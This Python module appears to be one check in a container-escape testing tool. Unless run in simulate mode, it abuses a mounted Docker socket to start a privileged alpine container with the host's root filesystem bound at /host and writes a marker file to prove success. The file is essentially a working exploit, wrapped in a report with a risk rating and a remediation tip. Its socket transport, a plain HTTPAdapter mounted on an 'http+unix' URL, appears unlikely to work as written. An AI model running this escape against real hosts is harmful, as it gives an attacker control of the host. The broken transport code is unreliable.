import json
import requests
import os
import time

def run(simulate=False):
    report = {
        "attack": "Docker Socket Abuse",
        "cve": "N/A",
        "description": "Abusing mounted /var/run/docker.sock to spawn container and execute commands.",
        "simulate": simulate,
        "exploit_executed": False,
        "result": None,
        "recommendation": "Avoid mounting docker.sock into containers unless absolutely necessary.",
        "risk_level": "High"
    }

    if simulate:
        report["result"] = "Simulated use of docker.sock to spawn a container."
        return report

    # === REAL EXPLOIT BEGINS ===
    sock_path = "/var/run/docker.sock"
    if not os.path.exists(sock_path):
        report["result"] = "docker.sock not found. Exploit failed."
        return report

    base_url = "http+unix://%2Fvar%2Frun%2Fdocker.sock"
    container_name = f"pwned-{int(time.time())}"

    # 1. Create container
    create_payload = {
        "Image": "alpine",
        "Cmd": ["touch", "/pwned_by_dockout"],
        "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": True
        }
    }

    try:
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter()
        session.mount(base_url, adapter)

        # create container
        res = session.post(base_url + "/v1.41/containers/create?name=" + container_name, json=create_payload)
        if res.status_code != 201:
            report["result"] = f"Container create failed: {res.text}"
            return report

        # start container
        cid = res.json()["Id"]
        start_res = session.post(base_url + f"/v1.41/containers/{cid}/start")
        if start_res.status_code == 204:
            report["exploit_executed"] = True
            report["result"] = f"Exploit succeeded: container `{container_name}` started and wrote to /pwned_by_dockout."
        else:
            report["result"] = f"Container start failed: {start_res.text}"

    except Exception as e:
        report["result"] = f"Exploit failed: {str(e)}"

    return report
